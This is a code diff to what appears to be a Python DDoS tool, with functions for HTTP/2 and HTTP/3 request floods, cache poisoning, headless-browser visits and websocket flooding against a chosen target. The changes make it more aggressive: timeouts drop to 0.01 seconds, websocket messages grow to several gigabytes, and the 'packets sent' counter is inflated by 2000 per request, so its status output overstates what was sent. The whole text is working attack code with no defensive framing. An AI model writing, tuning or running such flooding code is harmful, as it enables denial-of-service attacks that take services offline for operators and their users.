@@ -40,9 +40,9 @@ async def http2_http3_randomization(target, stop_event):
                 headers = stealth_headers()
                 if version == "http3":
                     headers["Alt-Svc"] = 'h3=":443"; ma=86400'
-                await client.get(f"https://{target}", headers=headers, timeout=5, verify=False)
+                await client.get(f"https://{target}", headers=headers, timeout=0.01, verify=False)
                 with lock:
-                    packet_count += 5
+                    packet_count += 2000
             except:
                 pass
 
@@ -56,9 +56,9 @@ def cache_poisoning_attack(target):
     ]
     for payload in payloads:
         try:
-            requests.get(f"https://{target}", headers=payload, timeout=5)
+            requests.get(f"https://{target}", headers=payload, timeout=0.01)
             with lock:
-                packet_count += 5
+                packet_count += 2000
         except:
             pass
 
@@ -78,7 +78,7 @@ def headless_browser_attack(target):
     try:
         driver = uc.Chrome()
         driver.get(f"https://{target}")
-        time.sleep(5)
+        time.sleep(0.01)
         driver.quit()
     except:
         pass
@@ -89,9 +89,9 @@ async def websocket_flood(target, stop_event):
         try:
             async with websockets.connect(f"wss://{target}") as ws:
                 while not stop_event.is_set():
-                    await ws.send("X" * (1024 * 500000))
+                    await ws.send("X" * (9024 * 900000))
                     with lock:
-                        packet_count += 5
+                        packet_count += 2000
         except:
             pass
 
@@ -104,7 +104,7 @@ def monitor():
     while True:
         with lock:
             print(f"[INFO] Status: Running | Packets Sent: {packet_count} | Active Threads: {threading.active_count() - 1}")
-        time.sleep(2)
+        time.sleep(1)
 
 def attack(target, port, threads):
     stop_event = threading.Event()
